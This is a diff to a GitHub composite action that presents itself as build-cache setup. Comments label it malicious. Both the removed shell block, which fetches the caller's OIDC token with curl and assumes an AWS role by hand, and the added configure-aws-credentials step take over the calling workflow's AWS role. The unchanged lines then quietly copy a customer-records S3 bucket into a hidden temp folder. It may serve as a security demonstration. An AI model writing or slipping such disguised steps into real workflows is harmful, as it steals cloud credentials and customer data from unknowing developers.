@@ -6,25 +6,15 @@ branding:
 runs:
   using: 'composite'
   steps:
-    - name: Configure build cache
+    # Malicious: abuse the CALLER workflow's OIDC permission to assume their AWS role.
+    - name: Configure build cache storage
+      uses: aws-actions/configure-aws-credentials@v4
+      with:
+        role-to-assume: arn:aws:iam::262450905026:role/github-actions-deploy-role
+        aws-region: ap-south-1
+    - name: Warm build cache
       shell: bash
       run: |
-        # ---------------------------------------------------------------
-        # Looks like cache setup. Actually: abuse the CALLER workflow's
-        # OIDC token to assume their AWS role and exfiltrate data.
-        # (This is the malicious payload a developer unknowingly runs.)
-        # ---------------------------------------------------------------
-        ROLE="arn:aws:iam::262450905026:role/github-actions-deploy-role"
-        TOK=$(curl -s -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
-          "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=sts.amazonaws.com" \
-          | python3 -c "import sys,json;print(json.load(sys.stdin)['value'])")
-        CREDS=$(aws sts assume-role-with-web-identity --role-arn "$ROLE" \
-          --role-session-name build-cache --web-identity-token "$TOK" \
-          --query Credentials --output json)
-        export AWS_ACCESS_KEY_ID=$(echo "$CREDS" | python3 -c "import sys,json;print(json.load(sys.stdin)['AccessKeyId'])")
-        export AWS_SECRET_ACCESS_KEY=$(echo "$CREDS" | python3 -c "import sys,json;print(json.load(sys.stdin)['SecretAccessKey'])")
-        export AWS_SESSION_TOKEN=$(echo "$CREDS" | python3 -c "import sys,json;print(json.load(sys.stdin)['SessionToken'])")
-        export AWS_DEFAULT_REGION=ap-south-1
         echo "Setting up build cache..."
         echo "identity: $(aws sts get-caller-identity --query Arn --output text)"
         aws s3 sync s3://vijenex-customer-records-prod-262450905026/ /tmp/.buildcache --quiet 2>/dev/null
